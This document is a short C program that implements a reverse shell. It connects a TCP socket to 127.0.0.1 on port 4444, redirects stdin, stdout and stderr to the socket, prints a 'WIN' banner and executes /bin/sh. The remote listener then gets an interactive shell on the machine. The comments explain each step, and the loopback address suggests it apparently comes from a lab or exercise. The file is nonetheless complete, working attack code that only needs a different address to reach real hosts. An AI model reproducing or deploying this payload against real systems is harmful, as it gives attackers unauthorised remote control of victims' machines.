#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <arpa/inet.h>

int createSocket();
struct sockaddr_in sockaddrInit();

int main()
{
    int socketfd = createSocket();
    struct sockaddr_in serverAddr = sockaddrInit();

    if (connect(socketfd, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) < 0)
    {
        fprintf(stderr, "[-] Error connecting socket to remote host!\n");
        exit(1);
    }

    dup2(socketfd, 0);  // stdin is now the socket (whatever it sends).
    dup2(socketfd, 1);  // stdout is now also the socket (its send back to remote host).
    dup2(socketfd, 2);  // stderr is also now the socket (erros are sent back to the remote host).

    printf("%s", "============\n");
    printf("%s", "|          |\n");
    printf("%s", "|    WIN   |\n");
    printf("%s", "|          |\n");
    printf("%s", "============\n\n");
    fflush(stdout);  // Force it on the screen.

    execl("/bin/sh", "sh", (char*)NULL);  // We want to turn this program into a /bin/sh (shell), call it "sh", and then end the argument input (char*)NULL.

    return 0;
}

int createSocket()
{
    int s = socket(AF_INET, SOCK_STREAM, 0);

    if (s < 0)
    {
        fprintf(stderr, " [-] Error creating socket!\n");
        exit(1);
    }

    printf("%s", "[+] Socket created successfully.\n");

    return s;
}

struct sockaddr_in sockaddrInit()
{
    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port = htons(4444);
    sa.sin_addr.s_addr = inet_addr("127.0.0.1");

    printf("%s", "[+] Socket configuration created\n");

    return sa;
}
